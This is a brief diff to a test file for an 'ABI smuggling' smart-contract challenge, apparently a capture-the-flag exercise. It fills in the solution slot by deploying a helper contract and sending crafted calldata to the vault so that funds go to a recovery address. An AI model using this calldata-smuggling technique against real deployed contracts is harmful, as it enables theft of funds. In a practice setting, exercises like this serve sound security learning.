@@ -43,8 +43,15 @@ describe('[Challenge] ABI smuggling', function () {
         ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
     });
 
-    it('Execution', async function () {
+    it('Execution ABI-Smuggling', async function () {
         /** CODE YOUR SOLUTION HERE */
+        getterContract = await (await ethers.getContractFactory('CalldataGetter', player)).deploy();
+        const calldata = await getterContract.getCalldata(vault.address, recovery.address, token.address);
+        const tx = await player.sendTransaction({
+            to: vault.address,
+            data: calldata,
+        });
+
     });
 
     after(async function () {
